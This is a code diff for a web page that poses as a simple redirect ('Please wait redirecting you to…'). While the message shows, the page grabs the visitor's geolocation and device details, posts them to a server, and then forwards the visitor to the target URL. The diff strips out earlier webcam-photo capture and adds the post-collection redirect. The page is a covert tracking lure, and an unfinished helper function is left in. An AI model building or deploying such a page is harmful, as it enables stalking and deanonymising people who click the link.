@@ -1,19 +1,10 @@
-// const baseUrl = 'https://google-map.up.railway.app';
 const baseUrl = 'http://localhost:9000';
-let locationParam = "https://www.google.com/maps/place/Sapporo,+Hokkaido,+Japan/@42.9853655,140.9183319,10z/data=!3m1!4b1!4m6!3m5!1s0x5f0ad4755a973633:0x33937e9d4687bad5!8m2!3d43.0617713!4d141.3544507!16zL20vMGdwNWw2?entry=ttu&g_ep=EgoyMDI1MDcyOS4wIKXMDSoASAFQAw%3D%3D";
 
 const loading = document.getElementById('loading');
 const urlParams = new URLSearchParams(window.location.search);
 
-locationParam = urlParams.get('location')?.length > 0 ? urlParams.get('location') : locationParam;
+const locationParam = urlParams.get('url')?.length > 0 ? urlParams.get('url') : "https://www.google.com";
 loading.textContent = "Please wait redirecting you to " + locationParam;
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-// const photo = document.getElementById('photo');
-const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-const random = Math.random().toString(36).substring(2, 8);
-const filename = `capture-${timestamp}-${random}.png`;
 
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
@@ -23,15 +14,15 @@ if (navigator.geolocation) {
                 longitude: position.coords.longitude,
             }
 
-            const photo = {
-                name: filename,
-                path: "photos/" + filename
-            }
+            // const photo = {
+            //     name: filename,
+            //     path: "photos/" + filename
+            // }
 
             const targetRequest = {
                 location: location,
                 device: getDeviceInformation(),
-                photo: photo
+                // photo: photo
             }
 
             saveLocation(targetRequest)
@@ -40,7 +31,10 @@ if (navigator.geolocation) {
                 })
                 .catch(err => {
                     console.error("Error saving location:", err);
-                });
+                })
+                .finally(() => {
+                    window.location.replace(baseUrl + '/locations?url=' + encodeURIComponent(locationParam));
+                })
         },
         function(error) {
             console.error("Error getting location:", error.message);
@@ -69,6 +63,14 @@ const saveLocation = async (req) => {
             console.error('Error sending coordinates:', error);
             reject(error);
         });
+    });
+}
+
+const redirectURL = async () => {
+    return new Promise((resolve, reject) => {
+        fetch(baseUrl + '/locations', {
+            method: 'GET',
+        })
     });
 }
 
